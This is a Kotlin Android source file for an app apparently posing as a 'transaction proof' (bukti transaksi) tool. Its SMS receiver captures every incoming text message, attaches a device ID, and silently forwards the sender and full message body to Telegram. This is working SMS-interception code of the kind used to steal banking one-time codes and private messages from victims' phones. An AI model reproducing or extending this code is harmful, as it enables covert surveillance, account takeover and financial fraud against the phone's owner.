package com.buktitransaksi.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.regex.Pattern

class SmsReceiver : BroadcastReceiver() {
    private val TAG = "SmsReceiver"
    private val scope = CoroutineScope(Dispatchers.IO)

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (sms in messages) {
                val originatingAddress = sms.originatingAddress ?: "Unknown"
                val body = sms.messageBody ?: ""

                Log.d(TAG, "SMS diterima dari: $originatingAddress | Pesan: $body")

                val deviceId = DeviceIdHelper.getDeviceId(context)

                // Parsing nama pengirim & isi pesan sesuai aturan
                // Pola regex: ^([A-Za-z0-9\s\-.]{2,20}):\s*(.+)$
                val pattern = Pattern.compile("^([A-Za-z0-9\\s\\-\\.]{2,20}):\\s*(.+)$")
                val matcher = pattern.matcher(body)

                val sender: String
                val finalMessage: String

                if (matcher.matches()) {
                    sender = matcher.group(1)?.trim() ?: originatingAddress
                    finalMessage = matcher.group(2)?.trim() ?: body
                } else {
                    sender = originatingAddress
                    finalMessage = body
                }

                // Format pesan ke Telegram dengan line break "\n\n" antar field
                val telegramMessage = """
                    Device : $deviceId

                    Pengirim : $sender

                    Pesan : $finalMessage
                """.trimIndent()

                scope.launch {
                    TelegramHelper.sendMessage(
                        message = telegramMessage,
                        onSuccess = {
                            Log.d(TAG, "SMS berhasil diteruskan ke Telegram")
                        },
                        onError = { e ->
                            Log.e(TAG, "Gagal meneruskan SMS ke Telegram", e)
                        }
                    )
                }
            }
        }
    }
}
